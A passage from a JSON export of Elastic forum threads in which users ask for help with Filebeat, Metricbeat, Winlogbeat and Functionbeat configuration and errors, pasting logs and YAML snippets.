    "body": "We have many applications where we would like to ingest their log data into Elastic Stack; however, the log shipping mechanism is syslog (BSD, CEF, or RFC 5424). Our use case is SIEM & threat hunting. Here are options I can think of: Send the logs to a server running rsyslog or syslog-ng, then consume this data with Filebeat. Send the logs to a Logstash server. Are there other options? Of these options, which is the most recommended?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "3160f7b7-2eb7-4a84-b86e-3f8288c72a47",
    "url": "https://discuss.elastic.co/t/log-file-still-harvesting-after-uninstalling-filebeat-metricbeat-heartbeat/225555",
    "title": "Log file still harvesting after uninstalling Filebeat,metricbeat,heartbeat",
    "category": [
      "Beats"
    ],
    "author": "",
    "date": "March 29, 2020, 2:10pm March 29, 2020, 11:53pm March 30, 2020, 12:34pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6601f453-7a53-40d9-9f2d-02fe582a0dcb",
    "url": "https://discuss.elastic.co/t/need-help-configuring-filebeat-path/225401",
    "title": "Need help configuring Filebeat Path",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Mattness",
    "date": "March 27, 2020, 12:22pm March 30, 2020, 11:30am March 30, 2020, 11:30am",
    "body": "Hello everyone, I am trying to send some log data to Elasticsearch with Filebeat. All the log files are contained in subdirectories inside a directory. E.g. C:\\Users\\Me\\Desktop\\Storage\\2019-06-13\\11*.log I want Filebeat to read and upload all the .log files inside the Storage directory. How do I have to phrase the path in .yml in order to make this work? I tried: C:\\Users\\Me\\Desktop\\Storage**.log without any sucess. Also I have disabled all other paths but Filebeat is still sending metric data to Elasticsearch, although not to a Filebeat-* index but rather to my already existing metricbeat-* index. Is that normal? Any help is very much appreciated",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "4f59da14-4135-4f3d-8541-d310d5c3b22d",
    "url": "https://discuss.elastic.co/t/filebeat-ansible-tags/225430",
    "title": "Filebeat Ansible Tags",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "santos1204",
    "date": "March 27, 2020, 3:13pm March 30, 2020, 10:38am March 30, 2020, 10:39am",
    "body": "Hi, I'm trying to pass tags using an ansible variable from each beats host, so that I can filter on those tags inside Kibana. I've tried several methods, but the tags don't seem to show. Whats the best way to achieve this? Thanks, Chris",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9ffc1a21-6e82-4647-8afe-4e921b2aeca8",
    "url": "https://discuss.elastic.co/t/duplicated-documents-when-log-file-is-rotated-while-elk-is-down/225655",
    "title": "Duplicated documents when log file is rotated while ELK is down",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "nahiko2000",
    "date": "March 30, 2020, 10:32am",
    "body": "Hi! We have many servers with a Tomcat in each server, with several applications in each server, and we want to save the applications log files in Elastic, so in each server we also have a Filebeat. -Between Filebeat and Elasticsearch, we have a two nodes Logstash cluster The log files each application writes rotate every 10 MB (It is log4j which makes them rotate, they rotate by renaming the files, inode remains always the same), so we have up to 11 files, for example \"trace.log\", \"trace.log.1\", \"trace.log.2\"... \"trace.log.10\" filebeat.yml config file \"type\" is: - type: log enabled: true paths: - /logs/trace/trace.log* multiline.pattern: '^\\[[0-9]{2}\\/[0-9]{2}\\/[0-9]{4}' multiline.negate: true multiline.match: after fields: tipo: standard infra: ob These servers (machines) are never switched off, Tomcat never stops, Filebeat never stops Then we have 3 Elasticsearch nodes and 2 Logstash + Kibana nodes - Elasticsearch, logstash and kibana nodes are switched off at night, and stay turned off for all night (like 12 hours) While Elasticsearch, Logstash and Kibana are working (switched on) everything works like a charm, even when log files rotate. However, and this is the problem, when a log file rotates while Elasticsearch, Logstash and Kibana are down (at nigh), all the rotated files are ingested again (so everything gets duplicated) For example, we have already in Elasticsearch all the data for \"trace.log\", \"trace.log.1\", \"trace.log.2\"... \"trace.log.10\" and trace.log at night rotates, when Elasticsearch, Kibana and Logstash start, all those files \"trace.log\", \"trace.log.1\", \"trace.log.2\"... \"trace.log.10\" get ingested AGAIN in Elasticsearch, duplicanting all those documents. Why is this happening? Amost every night at least one file gets rotated. On weekend many files do! - It is not a problem of Filebeat sending \"at least once delivery\" it is duplicating 11 complete files!! Thanks in advance!!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "04eb63fd-b34f-42c7-93f8-450d8081869d",
    "url": "https://discuss.elastic.co/t/filebeat-e-d-errorr/225626",
    "title": "Filebeat -e -d \"*\" errorr",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "thywoe",
    "date": "March 30, 2020, 7:48am March 30, 2020, 8:48am March 30, 2020, 8:54am March 30, 2020, 8:55am March 30, 2020, 9:00am March 30, 2020, 9:04am March 30, 2020, 9:13am",
    "body": "I'm getting this \"Exiting: data path already locked by another beat\" anytime i execute this command 'sudo filebeat -e -d \"*\" ' and i cannot see my logs on kibana. I need help.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "cff99976-e242-47c1-b83b-1d4f6438270a",
    "url": "https://discuss.elastic.co/t/wildcard-directories/225544",
    "title": "Wildcard directories",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "mimimike",
    "date": "March 29, 2020, 10:57am March 30, 2020, 9:02am",
    "body": "Hi, I want to process the logs of multiple directories with filebeat. This files are contained in a share folder. I do not understand why the path \"\\\\share\\folder\\*.log\" works well and the path \"\\\\share\\*\\*.log\" works wrong. The second path is handled as plain text and I do not understand it. Thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "9655b591-1374-419a-a5b7-80605ceac770",
    "url": "https://discuss.elastic.co/t/syntax-error-on-raspbian/225508",
    "title": "Syntax error on Raspbian",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "Cereal",
    "date": "March 28, 2020, 9:02pm March 30, 2020, 8:18am",
    "body": "I'm trying to install Metricbeat on Raspbian to track my Pi-hole. I followed the install instructions for linux on elastics website (https://www.elastic.co/guide/en/beats/metricbeat/current/metricbeat-configuration.html). All I changed in the conf is the elastic and kibana ip address in the metricbeat.yaml files. When I try to start Metricbeat I get root@raspberrypi:/opt/metricbeat-7.6.1-linux-x86_64# sudo ./metricbeat -e ./metricbeat: 1: ./metricbeat: Syntax error: \"(\" unexpected Any ideas?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8fc83bcd-4f37-4655-9201-c206fb8b75d6",
    "url": "https://discuss.elastic.co/t/functionbeat-not-finding-default-credentials/222784",
    "title": "Functionbeat not finding default credentials",
    "category": [
      "Beats",
      "Functionbeat"
    ],
    "author": "Patrice1",
    "date": "March 9, 2020, 6:53pm March 10, 2020, 8:36am March 10, 2020, 2:22pm March 24, 2020, 10:27am March 27, 2020, 7:26pm March 31, 2020, 4:42pm April 19, 2020, 3:13pm",
    "body": "I followed the guide to connect cloudwatch logs to kibana. After adding in my credentials and configs, the beat is not able to deploy to S3. I have the IAM permissions described. I only get the following debugging logs: 2020-03-09T14:36:21.144-0400 INFO instance/beat.go:622 Home path: [C:\\Program Files\\Functionbeat] Config path: [C:\\Program Files\\Functionbeat] Data path: [/tmp] Logs path: [/tmp/logs] 2020-03-09T14:36:21.144-0400 DEBUG [beat] instance/beat.go:674 Beat metadata path: \\tmp\\meta.json 2020-03-09T14:36:21.144-0400 INFO instance/beat.go:630 Beat ID: c0fcb17c-41c2-4384-bd71-a0ad65082391 2020-03-09T14:36:21.168-0400 DEBUG [filters] add_cloud_metadata/providers.go:126 add_cloud_metadata: starting to fetch metadata, timeout=3s 2020-03-09T14:36:21.169-0400 DEBUG [filters] add_cloud_metadata/providers.go:162 add_cloud_metadata: received disposition for openstack after 0s. result=[provider:openstack, error=failed requesting openstack metadata: Get http://169.254.169.254/2009-04-04/meta-data/instance-id: dial tcp 169.254.169.254:80: connectex: A socket operation was attempted to an unreachable network., metadata={}] 2020-03-09T14:36:21.169-0400 DEBUG [filters] add_cloud_metadata/providers.go:162 add_cloud_metadata: received disposition for aws after 1.0006ms. result=[provider:aws, error=failed requesting aws metadata: Get http://169.254.169.254/2014-02-25/dynamic/instance-identity/document: dial tcp 169.254.169.254:80: connectex: A socket operation was attempted to an unreachable network., metadata={}] 2020-03-09T14:36:21.169-0400 DEBUG [filters] add_cloud_metadata/providers.go:162 add_cloud_metadata: received disposition for az after 1.0006ms. result=[provider:az, error=failed requesting az metadata: Get http://169.254.169.254/metadata/instance/compute?api-version=2017-04-02: dial tcp 169.254.169.254:80: connectex: A socket operation was attempted to an unreachable network., metadata={}] 2020-03-09T14:36:21.169-0400 DEBUG [filters] add_cloud_metadata/providers.go:162 add_cloud_metadata: received disposition for gcp after 1.0006ms. result=[provider:gcp, error=failed requesting gcp metadata: Get http://169.254.169.254/computeMetadata/v1/?recursive=true&alt=json: dial tcp 169.254.169.254:80: connectex: A socket operation was attempted to an unreachable network., metadata={}] 2020-03-09T14:36:21.169-0400 DEBUG [filters] add_cloud_metadata/providers.go:162 add_cloud_metadata: received disposition for digitalocean after 1.0006ms. result=[provider:digitalocean, error=failed requesting digitalocean metadata: Get http://169.254.169.254/metadata/v1.json: dial tcp 169.254.169.254:80: connectex: A socket operation was attempted to an unreachable network., metadata={}] 2020-03-09T14:36:21.170-0400 DEBUG [filters] add_cloud_metadata/providers.go:129 add_cloud_metadata: fetchMetadata ran for 2.0004ms 2020-03-09T14:36:21.170-0400 INFO add_cloud_metadata/add_cloud_metadata.go:89 add_cloud_metadata: hosting provider type not detected. 2020-03-09T14:36:21.170-0400 DEBUG [processors] processors/processor.go:101 Generated new processors: add_host_metadata=[netinfo.enabled=[false], cache.ttl=[5m0s]], add_cloud_metadata=null error while creating CLIManager: google: could not find default credentials. See https://developers.google.com/accounts/docs/application-default-credentials for more information. Thanks for your help.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "3ff4bd4b-3341-4456-9164-91bc7073b680",
    "url": "https://discuss.elastic.co/t/winlogbeat-export-dashboard-with-xpack/225415",
    "title": "Winlogbeat export Dashboard with Xpack",
    "category": [
      "Beats"
    ],
    "author": "xennn",
    "date": "March 27, 2020, 1:32pm March 29, 2020, 11:55pm",
    "body": "Hello, i want to export the Dashboards from winlogbeat and import the json to Kibana. I have a ELK Stack Setup and cant use the normal command from the documentation. The Stack is almost encrypted with ssl xpack. Kibana Service is not required for ssl. PS C:\\Program Files (x86)\\Winlogbeat\\winlogbeat> .\\winlogbeat export dashboard > dashboard.json Error creating Kibana client: fail to get the Kibana version: HTTP GET request to http://10.2.111.1:5601/api/status fail s: <nil>. Response: {\"statusCode\":401,\"error\":\"Unauthorized\",\"message\":\"Unauthorized\"}.. Serverlog: SERVER kibana[15001]: {\"type\":\"response\",\"@timestamp\":\"2020-03-27T13:08:56Z\",\"tags\":[\"api\"],\"pid\":15001,\"method\":\"get\",\"statusCode\":401,\"req\":{\"url\":\"/api/status\",\"method\":\"get\",\"headers\":{\"host\":\"10.2.111.1:5601\",\"user-agent\":\"Go-http-client/1.1\",\"accept\":\"application/json\",\"content-type\":\"application/json\",\"kbn-xsrf\":\"1\",\"accept-encoding\":\"gzip\"},\"remoteAddress\":\"10.2.30.174\",\"userAgent\":\"10.2.30.174\"},\"res\":{\"statusCode\":401,\"responseTime\":57,\"contentLength\":9},\"message\":\"GET /api/status 401 57ms - 9.0B\"}",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "4b29c716-3b5d-4667-a698-544e9b7c223b",
    "url": "https://discuss.elastic.co/t/metric-beats-mappings-for-optional-data/225588",
    "title": "Metric beats mappings for optional data",
    "category": [
      "Beats"
    ],
    "author": "wahaj",
    "date": "March 29, 2020, 8:58pm",
    "body": "I am trying to write a mapping for a custom metric beat whose goal is to capture the number of network connections for a list of protocols. There will be certain hosts, where a certain protocol will not be supported, while on some hosts all protocols will be supported. I have a couple of options that I'm contemplating: Have a separate event (i.e. ES document) for each protocol. In case a host doesn't support that protocol, don't log anything to ES for that protocol. Having a single document for all protocols, with # of connections for each. In case the protocol is not supported on this host, the value will be 0. Have the same structure as (2), however, in case a protocol is not supported on the host, simply remove that key-value pair, instead of adding a 0 value. That is, there will be only one event for all the protocols, but it will only have data for the protocols that this hosts supports. Eventually, there will be variance in the documents across hosts. The issue with 1 is that it uses more storage, since other meta data in the event document will get duplicated for each event. Between 2 and 3, I'm trying to understand if there are any performance implications, when doing queries with Kibana. (2) will use more storage, hence 3 seems the most efficient.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "5516cd30-f1f2-440a-990b-a2c5fbe3f0cb",
    "url": "https://discuss.elastic.co/t/filebeat-config-to-read-current-log-only/225442",
    "title": "Filebeat config to read current log only",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "manikandanb87",
    "date": "March 27, 2020, 3:43pm March 29, 2020, 2:01pm",
    "body": "Hi Team, I have file beat cofigured on one of my machine and it is configured to send the feed to logstash. The thing is, I want my files to be read depending on todays date. My log files are getting generated in the format - Mylog_0411.Log. Mylog_=>Log file name 04=>Month 11=>Date So, How can I restrict file beat to read/tail the current file(todays file) log only. Thanks!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "4ac0d6d7-aeaa-4631-98f0-655c6a5bfcca",
    "url": "https://discuss.elastic.co/t/how-to-send-windows-events-through-winlogbeat-to-humio/225439",
    "title": "How to send windows events through winlogbeat to Humio?",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "romattos",
    "date": "March 27, 2020, 3:35pm March 29, 2020, 1:55pm",
    "body": "How to send windows events through winlogbeat to Humio? I get this error: Exiting: Couldn't connect to any of the configured Elasticsearch hosts. Errors: [Error connection to Elasticsearch http://xxxxxxxxx",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e4fb39dd-53cd-4933-ae28-4649c684cef5",
    "url": "https://discuss.elastic.co/t/winlogbeats-template-necessary-to-keep-all-fields/225479",
    "title": "WinlogBeats template : Necessary to keep all fields?",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "Travis",
    "date": "March 28, 2020, 10:06am",
    "body": "Hello ! As I don't send Winlogbeats logs directly to Elasticsearch, I had to export and import the template. I noticed that the file is huge ! It contains almost four thousand lines. I noticed some fields related to Kubernetes, Docker, Jolokia. If I don't use these services, can I remove them with no incidence ? Thanks for your feedback !",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "ca759bc1-f2d0-4772-a85d-3c552f403b07",
    "url": "https://discuss.elastic.co/t/system-diskio-iostat-await-value-bump-too-high/224240",
    "title": "System.diskio.iostat.await value bump too high",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "HenryDuong",
    "date": "March 19, 2020, 9:42am March 19, 2020, 11:49am March 19, 2020, 12:19pm March 19, 2020, 2:23pm March 19, 2020, 7:09pm March 27, 2020, 8:27pm",
    "body": "Hi guys, I'm using the Metricbeat module version 7.2.0 to collect system KPI, but the system.diskio.iostat.await value is so wrong, it returns the value too large to be right. And I make sure the system has nothing wrong. I use another tool is Munin to monitor the system and use it to compare with Metricbeat module. Also, I can't reproduce this issue, it's happen 2 times already, the first one is when the system run about 2 days and the second is when the system run nearly a week. So I wonder if anyone have met this issue, could you please help me? Thanks. Screenshot from 2020-03-19 16-39-031578×668 37.5 KB",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "5f5434f1-278c-47b9-91c6-f8928c204238",
    "url": "https://discuss.elastic.co/t/metricbeat-module-docker-vs-memory-dataset/224802",
    "title": "Metricbeat module docker vs memory dataset",
    "category": [
      "Beats"
    ],
    "author": "stefws",
    "date": "March 24, 2020, 10:29am March 24, 2020, 4:22pm March 24, 2020, 4:32pm March 25, 2020, 11:55am March 25, 2020, 2:20pm March 26, 2020, 7:40am March 26, 2020, 7:40am March 26, 2020, 7:56am March 26, 2020, 3:23pm March 27, 2020, 9:23am March 27, 2020, 9:42am March 27, 2020, 3:04pm March 27, 2020, 3:11pm March 27, 2020, 4:04pm March 27, 2020, 6:55pm March 27, 2020, 8:04pm",
    "body": "When I try to run metricbeat 7.6.1 on a CentOS 7 box with docker-engine-17.05.0.ce-1.el7.centos.x86_64, I see these warning logged every time docker attempts to ship the memory metricset: 2020-03-24T11:14:00.316+0100<tab>ERROR<tab>elasticsearch/client.go:410<tab>Failed to encode event: unsupported float value: NaN 2020-03-24T11:14:00.316+0100<tab>ERROR<tab>elasticsearch/client.go:410<tab>Failed to encode event: unsupported float value: NaN <tab> = Ctrl-I chars And thus see no doc w/event.dataset:docker.memory, wondering why?",
    "website_area": "discuss",
    "replies": 16
  },
  {
    "id": "e8d0f311-1def-4ce3-832d-0035f29baf82",
    "url": "https://discuss.elastic.co/t/how-to-measure-megabytes-transferred-between-beats-and-logstash-over-5044-port/225431",
    "title": "How to measure megabytes transferred between Beats and Logstash over 5044 port",
    "category": [
      "Beats"
    ],
    "author": "saif3r",
    "date": "March 27, 2020, 3:15pm",
    "body": "Hello, I was asked to measure how much data we send from Beats to Logstash over 24h period. Are such statistics available somewhere in Beats or Logstash? I can't install anything on a computer where Beats is installed so I was trying to use some linux based tools like iptables on logstash node but I'm having a hard time pulling this specific piece of information. Thanks in advance!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "6917928b-7b1e-4c61-a19e-aada361006a4",
    "url": "https://discuss.elastic.co/t/object-mapping-for-host-tried-to-parse-field-host-as-object-but-found-a-concrete-value-on-filebeat-ingest/224433",
    "title": "\"object mapping for [host] tried to parse field [host] as object, but found a concrete value\" on filebeat/ingest",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "EldrosKandar",
    "date": "March 20, 2020, 2:33pm March 20, 2020, 4:34pm March 23, 2020, 9:47am March 27, 2020, 3:13pm",
    "body": "By creation of a new pipeline, the following error began to pop up on the filebeat side: {\"type\":\"mapper_parsing_exception\",\"reason\":\"object mapping for [host] tried to parse field [host] as object, but found a concrete value\"} I thought it might be something like the breaking change with the field host even though logstash is not used but instead filebeat feeds directly into the ingest pipeline. I first tried to add the processor the the filebeat.yml in order to drop the field, but there were no changes observed. I then tried removing the field from the pipeline, but now I'm becoming the following error: {\"type\":\"illegal_argument_exception\",\"reason\":\"field [host] not present as part of path [host]\"} In the pipeline, or the filebeat.yml there is no mention of the field host, so I'm wondering, where does this host field comes from which causes the conflict.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "992768f2-5b3d-4937-8d3c-42c0b52fac3d",
    "url": "https://discuss.elastic.co/t/filebeat-not-reading-log-files/225284",
    "title": "Filebeat not reading log files",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Mastana_Guru",
    "date": "March 26, 2020, 8:24pm March 26, 2020, 10:15pm March 27, 2020, 2:57pm March 27, 2020, 2:58pm",
    "body": "Hi, Filebeat is not processing any files from the input folders Setup : Filebeat -> Logstash -> Elasticsearch -> Kibana (All are version 7.6.1) Filebeat docker running on mac, only one instance running. ELK running in Openshift 3.1l. Logstash service is port-forwarded (5044) to localhost logstash pipeline input { beats { port => 5044 } } logstash startup logs [INFO ] 2020-03-26 15:19:34.417 [[main]-pipeline-manager] beats - Beats inputs: Starting input listener {:address=>\"0.0.0.0:5044\"} [INFO ] 2020-03-26 15:19:34.475 [[main]-pipeline-manager] javapipeline - Pipeline started {\"pipeline.id\"=>\"main\"} [INFO ] 2020-03-26 15:19:34.487 [Agent thread] agent - Pipelines running {:count=>1, :running_pipelines=>[:main], :non_running_pipelines=>[]} [INFO ] 2020-03-26 15:19:34.585 [Api Webserver] agent - Successfully started Logstash API endpoint {:port=>9600} [INFO ] 2020-03-26 15:19:34.717 [[main]<beats] Server - Starting server on port: 5044 filebeat.yaml filebeat.config: modules: path: ${path.config}/modules.d/*.yml reload.enabled: false output.logstash: hosts: [\"docker.for.mac.localhost:5044\"] filebeat.inputs: - type: log enabled: true paths: - /Users/u740885/git/ocp-elk/development/logs/*.log filebeat startup logs 2020-03-26T19:47:33.916Z INFO instance/beat.go:298 Setup Beat: filebeat; Version: 7.6.1 2020-03-26T19:47:33.917Z INFO [publisher] pipeline/module.go:110 Beat name: ac9600497852 2020-03-26T19:47:33.918Z WARN beater/filebeat.go:152 Filebeat is unable to load the Ingest Node pipelines for the configured modules because the Elasticsearch output is not configured/enabled. If you have already loaded the Ingest Node pipelines or are using Logstash pipelines, you can ignore this warning. 2020-03-26T19:47:33.918Z INFO instance/beat.go:439 filebeat start running. 2020-03-26T19:47:33.918Z INFO registrar/migrate.go:104 No registry home found. Create: /usr/share/filebeat/data/registry/filebeat 2020-03-26T19:47:33.919Z INFO registrar/migrate.go:112 Initialize registry meta file 2020-03-26T19:47:33.920Z INFO registrar/registrar.go:108 No registry file found under: /usr/share/filebeat/data/registry/filebeat/data.json. Creating a new registry file. 2020-03-26T19:47:33.923Z INFO registrar/registrar.go:145 Loading registrar data from /usr/share/filebeat/data/registry/filebeat/data.json 2020-03-26T19:47:33.923Z INFO registrar/registrar.go:152 States Loaded from registrar: 0 2020-03-26T19:47:33.923Z WARN beater/filebeat.go:368 Filebeat is unable to load the Ingest Node pipelines for the configured modules because the Elasticsearch output is not configured/enabled. If you have already loaded the Ingest Node pipelines or are using Logstash pipelines, you can ignore this warning. 2020-03-26T19:47:33.923Z INFO crawler/crawler.go:72 Loading Inputs: 1 2020-03-26T19:47:33.924Z INFO log/input.go:152 Configured paths: [/Users/u740885/git/ocp-elk/development/logs/*.log] 2020-03-26T19:47:33.924Z INFO input/input.go:114 Starting input of type: log; ID: 16971255910140926814 2020-03-26T19:47:33.924Z INFO crawler/crawler.go:106 Loading and starting Inputs completed. Enabled inputs: 1 2020-03-26T19:47:33.924Z INFO cfgfile/reload.go:171 Config reloader started 2020-03-26T19:47:33.924Z INFO cfgfile/reload.go:226 Loading of config files completed. docker exec -it filebeat ./filebeat test output logstash: docker.for.mac.localhost:5044... connection... parse host... OK dns lookup... OK addresses: 192.168.65.2 dial up... OK TLS... WARN secure connection disabled talk to server... OK docker exec -it filebeat ./filebeat -c filebeat.yml -e -d \"*\" 2020-03-26T20:22:11.626Z INFO instance/beat.go:622 Home path: [/usr/share/filebeat] Config path: [/usr/share/filebeat] Data path: [/usr/share/filebeat/data] Logs path: [/usr/share/filebeat/logs] 2020-03-26T20:22:11.626Z DEBUG [beat] instance/beat.go:674 Beat metadata path: /usr/share/filebeat/data/meta.json 2020-03-26T20:22:11.626Z INFO instance/beat.go:630 Beat ID: 0df76fb1-c1e5-44b2-99e7-751f0ce616ed 2020-03-26T20:22:11.626Z INFO instance/beat.go:380 filebeat stopped. 2020-03-26T20:22:11.626Z ERROR instance/beat.go:933 Exiting: data path already locked by another beat Exiting: data path already locked by another beat",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1ed65285-68b3-43c8-9318-182979034572",
    "url": "https://discuss.elastic.co/t/timestamp-processor-parsing-milliseconds-with-comma/225068",
    "title": "Timestamp processor - parsing milliseconds with comma",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "dcamozzato",
    "date": "March 25, 2020, 8:56pm March 27, 2020, 2:22pm March 27, 2020, 2:24pm",
    "body": "Hi, I am trying to use Filebeat 7.5.1 to parse a timestamp with the following format: '2020-01-17 06:37:17,849' My layout is this: '2006-01-02 15:04:05,999' Unfortunately, the above does not work. According to Golang docs, I need to define milliseconds with a period (e.g., \".999\"). Indeed, if I change both the sample and the layout to use a period, it works. I am linking here the Go Playground for this. Is there a way to get the timestamp processor to do what I need it to do? If not, is there some other way to get around this? For example, I couldn't find a way to concatenate fields, otherwise I could possibly use a dissect processor to split the comma out, and then join the fields with a period in the middle. Any help is appreciated.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1b51801f-cd28-48bc-9b10-462d57e08d5f",
    "url": "https://discuss.elastic.co/t/logstash-a-plugin-had-an-unrecoverable-error-will-restart-this-plugin/225318",
    "title": "Logstash: A plugin had an unrecoverable error. Will restart this plugin",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Ekta",
    "date": "March 27, 2020, 1:40am March 27, 2020, 11:16am March 27, 2020, 11:30am",
    "body": "When I start my logstash config file it show like this [2020-03-26T21:24:52,293][INFO ][logstash.javapipeline ][main] Starting pipeline {:pipeline_id=>\"main\", \"pipeline.workers\"=>4, \"pipeline.batch.size\"=>125, \"pipeline.batch.delay\"=>50, \"pipeline.max_inflight\"=>500, \"pipeline.sources\"=>[\"/etc/logstash/conf.d/logsample.conf\"], :thread=>\"#<Thread:0x9b6e1d run>\"} [2020-03-26T21:24:53,705][INFO ][logstash.inputs.beats ][main] Beats inputs: Starting input listener {:address=>\"0.0.0.0:5044\"} [2020-03-26T21:24:53,723][INFO ][logstash.javapipeline ][main] Pipeline started {\"pipeline.id\"=>\"main\"} [2020-03-26T21:24:53,828][INFO ][logstash.agent ] Pipelines running {:count=>1, :running_pipelines=>[:main], :non_running_pipelines=>} [2020-03-26T21:24:53,866][INFO ][org.logstash.beats.Server][main] Starting server on port: 5044 [2020-03-26T21:24:54,231][INFO ][logstash.agent ] Successfully started Logstash API endpoint {:port=>9601} [2020-03-26T21:25:00,388][ERROR][logstash.javapipeline ][main] A plugin had an unrecoverable error. Will restart this plugin. Pipeline_id:main Plugin: <LogStash::Inputs::Beats port=>5044, id=>\"adae4b1c0546afc7546b2b6f4f87a509665cacafac15ab463143e33a9c62c9eb\", enable_metric=>true, codec=><LogStash::Codecs::Plain id=>\"plain_5841d340-9c84-460c-a045-a6fbdedff159\", enable_metric=>true, charset=>\"UTF-8\">, host=>\"0.0.0.0\", ssl=>false, add_hostname=>false, ssl_verify_mode=>\"none\", ssl_peer_metadata=>false, include_codec_tag=>true, ssl_handshake_timeout=>10000, tls_min_version=>1, tls_max_version=>1.2, cipher_suites=>[\"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384\", \"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\", \"TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256\", \"TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\", \"TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384\", \"TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384\", \"TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256\", \"TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256\"], client_inactivity_timeout=>60, executor_threads=>4> Error: Address already in use Exception: Java::JavaNet::BindException Stack: sun.nio.ch.Net.bind0(Native Method) sun.nio.ch.Net.bind(sun/nio/ch/Net.java:433) sun.nio.ch.Net.bind(sun/nio/ch/Net.java:425) sun.nio.ch.ServerSocketChannelImpl.bind(sun/nio/ch/ServerSocketChannelImpl.java:220) io.netty.channel.socket.nio.NioServerSocketChannel.doBind(io/netty/channel/socket/nio/NioServerSocketChannel.java:130) io.netty.channel.AbstractChannel$AbstractUnsafe.bind(io/netty/channel/AbstractChannel.java:558) io.netty.channel.DefaultChannelPipeline$HeadContext.bind(io/netty/channel/DefaultChannelPipeline.java:1358) io.netty.channel.AbstractChannelHandlerContext.invokeBind(io/netty/channel/AbstractChannelHandlerContext.java:501) io.netty.channel.AbstractChannelHandlerContext.bind(io/netty/channel/AbstractChannelHandlerContext.java:486) io.netty.channel.DefaultChannelPipeline.bind(io/netty/channel/DefaultChannelPipeline.java:1019) io.netty.channel.AbstractChannel.bind(io/netty/channel/AbstractChannel.java:254) io.netty.bootstrap.AbstractBootstrap$2.run(io/netty/bootstrap/AbstractBootstrap.java:366) io.netty.util.concurrent.AbstractEventExecutor.safeExecute(io/netty/util/concurrent/AbstractEventExecutor.java:163) io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(io/netty/util/concurrent/SingleThreadEventExecutor.java:404) io.netty.channel.nio.NioEventLoop.run(io/netty/channel/nio/NioEventLoop.java:462) io.netty.util.concurrent.SingleThreadEventExecutor$5.run(io/netty/util/concurrent/SingleThreadEventExecutor.java:897) io.netty.util.concurrent.FastThreadLocalRunnable.run(io/netty/util/concurrent/FastThreadLocalRunnable.java:30) java.lang.Thread.run(java/lang/Thread.java:748) [2020-03-26T21:25:01,405][INFO ][org.logstash.beats.Server][main] Starting server on port: 5044 can anyone help in this",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6b4db0bf-dfcf-4e58-83b4-981e564b3dde",
    "url": "https://discuss.elastic.co/t/error-instance-beat-go-933-exiting-error-reading-config-file-required-object-but-found-string-in-field-filebeat-inputs-1-source-filebeat-yml/225074",
    "title": "ERROR instance/beat.go:933 Exiting: Error reading config file: required 'object', but found 'string' in field 'filebeat.inputs.1' (source:'filebeat.yml')",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "hemant_472",
    "date": "March 25, 2020, 10:13pm March 27, 2020, 1:03am March 27, 2020, 8:50am",
    "body": "Hi, i am getting this error and not able to access my log file `''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''' filebeat.inputs: Each - is an input. Most options can be set at the input level, so you can use different inputs for various configurations. Below are the input specific configurations. type: log Change to true to enable this input configuration. enabled: true Paths that should be crawled and fetched. Glob based paths. paths: /home/hemantkumar/elastic search training/elasticsearch-7.6.0/logs/logex/* #-------------------------- Elasticsearch output ------------------------------ #output.elasticsearch: Array of hosts to connect to. #hosts: [\"localhost:9200\"] Protocol - either http (default) or https. #protocol: \"https\" Authentication credentials - either API key or username/password. api_key: \"id:api_key\" username: \"elastic\" password: \"12345678\" #----------------------------- Logstash output -------------------------------- output.logstash: #The Logstash hosts hosts: [\"localhost:5044\"] Optional SSL. By default is off. List of root certificates for HTTPS server verifications #ssl.certificate_authorities: [\"/etc/pki/root/ca.pem\"] Certificate for SSL client authentication #ssl.certificate: \"/etc/pki/client/cert.pem\" Client Certificate Key #ssl.key: \"/etc/pki/client/cert.key\" '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''` Please let me know if there is something wrong in my 